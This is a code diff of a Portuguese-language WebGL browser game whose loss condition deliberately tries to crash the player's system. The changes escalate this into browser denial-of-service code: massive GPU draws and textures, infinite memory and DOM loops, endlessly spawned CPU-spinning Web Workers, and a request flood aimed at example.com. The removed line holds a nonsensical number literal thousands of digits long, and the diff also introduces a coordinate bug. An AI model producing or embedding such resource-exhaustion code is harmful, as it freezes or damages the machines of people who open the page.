@@ -2,16 +2,16 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>Jogo WebGL com Crash</title>
+    <title>Jogo WebGL com Crash Extremo</title>
     <style>
         body { margin: 0; background: #000; color: #fff; font-family: Arial; text-align: center; }
         canvas { border: 2px solid #fff; display: block; margin: 0 auto; }
         #status { position: absolute; top: 10px; left: 10px; font-size: 18px; }
-        #warning { margin: 10px; color: red; }
+        #warning { margin: 10px; color: red; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div id="warning">AVISO: Perder pode travar seu navegador! Teste com cuidado.</div>
+    <div id="warning">PERIGO: Perder PODE DANIFICAR SEU DISPOSITIVO! Teste apenas em máquina virtual ou hardware descartável.</div>
     <div id="status">Use o mouse para evitar o círculo vermelho!</div>
     <canvas id="gl-canvas" width="800" height="600"></canvas>
 
@@ -35,10 +35,14 @@
             }
         `;
         const fragmentShaderSource = `
-            precision mediump float;
+            precision highp float;
             uniform vec4 u_color;
             void main() {
-                gl_FragColor = u_color;
+                vec4 color = u_color;
+                for (int i = 0; i < 1000; i++) {
+                    color += vec4(0.0001 * float(i));
+                }
+                gl_FragColor = color;
             }
         `;
 
@@ -52,7 +56,7 @@
                 document.getElementById('status').textContent = 'Erro no shader: veja console.';
                 console.error('Erro no shader:', error);
                 gl.deleteShader(shader);
-                throw new Error('Shader falhou: ' + error);
+                throw new Error('Shader falhou');
             }
             return shader;
         }
@@ -68,7 +72,7 @@
             const error = gl.getProgramInfoLog(program);
             document.getElementById('status').textContent = 'Erro no programa: veja console.';
             console.error('Erro no programa:', error);
-            throw new Error('Programa falhou: ' + error);
+            throw new Error('Programa falhou');
         }
         gl.useProgram(program);
 
@@ -119,7 +123,7 @@
             const translatedVertices = new Float32Array(vertices.length);
             for (let i = 0; i < vertices.length; i += 2) {
                 translatedVertices[i] = vertices[i] + pos.x;
-                translatedVertices[i + 1] = vertices[i + 1] + pos.y;
+                translatedVertices[i + 1] = vertices[i] + pos.y;
             }
             gl.bufferData(gl.ARRAY_BUFFER, translatedVertices, gl.STATIC_DRAW);
             gl.enableVertexAttribArray(positionLocation);
@@ -132,15 +136,15 @@
         function checkCollision() {
             const dx = playerPos.x - enemyPos.x;
             const dy = playerPos.y - enemyPos.y;
-            return Math.sqrt(dx * dx + dy * dy) < 45; // Soma dos raios
+            return Math.sqrt(dx * dx + dy * dy) < 45;
         }
 
-        // Função de crash
-        function crashWebGL() {
-            document.getElementById('status').textContent = 'VOCÊ PERDEU! TENTANDO CRASHAR...';
+        // Múltiplos métodos de crash
+        function crashSystem() {
+            document.getElementById('status').textContent = 'VOCÊ PERDEU! TENTANDO CRASHAR O SISTEMA...';
             try {
-                // 1 milhão de pontos
-                const vertexCount = 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999;
+                // 1. WebGL: 2 milhões de pontos
+                const vertexCount = 2000000;
                 const crashVertices = new Float32Array(vertexCount * 2);
                 for (let i = 0; i < vertexCount * 2; i += 2) {
                     crashVertices[i] = Math.random() * canvas.width;
@@ -150,35 +154,65 @@
                 gl.bindBuffer(gl.ARRAY_BUFFER, crashBuffer);
                 gl.bufferData(gl.ARRAY_BUFFER, crashVertices, gl.STATIC_DRAW);
 
-                // Texturas grandes
+                // Texturas enormes
                 const textures = [];
-                for (let i = 0; i < 20; i++) {
+                for (let i = 0; i < 50; i++) {
                     const texture = gl.createTexture();
                     gl.bindTexture(gl.TEXTURE_2D, texture);
-                    const size = 4096; // Menor para mais compatibilidade
+                    const size = 8192;
                     const data = new Uint8Array(size * size * 4);
                     gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
                     textures.push(texture);
                 }
 
-                // Loop de renderização
-                function crashLoop() {
+                // Loop WebGL
+                function crashWebGLLoop() {
                     gl.clear(gl.COLOR_BUFFER_BIT);
                     gl.bindBuffer(gl.ARRAY_BUFFER, crashBuffer);
                     gl.enableVertexAttribArray(positionLocation);
                     gl.vertexAttribPointer(positionLocation, 2, gl.FLOAT, false, 0, 0);
                     gl.uniform4f(colorLocation, 1, 0, 0, 1);
-                    gl.drawArrays(gl.POINTS, 0, vertexCount);
-                    requestAnimationFrame(crashLoop);
+                    for (let i = 0; i < 10; i++) {
+                        gl.drawArrays(gl.POINTS, 0, vertexCount);
+                    }
+                    requestAnimationFrame(crashWebGLLoop);
                 }
-                crashLoop();
+                crashWebGLLoop();
 
-                // Sobrecarga extra de memória
+                // 2. Memória
                 setTimeout(() => {
                     while (true) {
-                        new Array(1000000).fill(Math.random());
+                        const arr = new Array(1000000).fill(new Float32Array(1000));
                     }
-                }, 1000);
+                }, 100);
+
+                // 3. Web Workers (CPU)
+                function crashWorkers() {
+                    const blob = new Blob(['while(true){for(let i=0;i<1000000;i++){Math.sin(i);}}'], { type: 'text/javascript' });
+                    const url = URL.createObjectURL(blob);
+                    new Worker(url);
+                    setTimeout(crashWorkers, 10);
+                }
+                crashWorkers();
+
+                // 4. DOM
+                setTimeout(() => {
+                    while (true) {
+                        for (let i = 0; i < 1000; i++) {
+                            const div = document.createElement('div');
+                            div.style.width = '100px';
+                            div.style.height = '100px';
+                            document.body.appendChild(div);
+                        }
+                    }
+                }, 200);
+
+                // 5. Rede (limitado por CORS)
+                setTimeout(() => {
+                    while (true) {
+                        fetch('https://example.com', { mode: 'no-cors' }).catch(() => {});
+                    }
+                }, 300);
             } catch (e) {
                 document.getElementById('status').textContent = 'Crash falhou: veja console.';
                 console.error('Erro no crash:', e);
@@ -193,8 +227,8 @@
             const dx = playerPos.x - enemyPos.x;
             const dy = playerPos.y - enemyPos.y;
             const dist = Math.sqrt(dx * dx + dy * dy);
-            enemyPos.x += (dx / dist) * 2; // Segue o jogador
-            enemyPos.y += (dy / dist) * 2;
+            enemyPos.x += (dx / dist) * 3;
+            enemyPos.y += (dy / dist) * 3;
             enemyPos.x = Math.max(25, Math.min(canvas.width - 25, enemyPos.x));
             enemyPos.y = Math.max(25, Math.min(canvas.height - 25, enemyPos.y));
 
@@ -207,7 +241,7 @@
             // Colisão
             if (checkCollision()) {
                 gameOver = true;
-                crashWebGL();
+                crashSystem();
             } else {
                 requestAnimationFrame(gameLoop);
             }
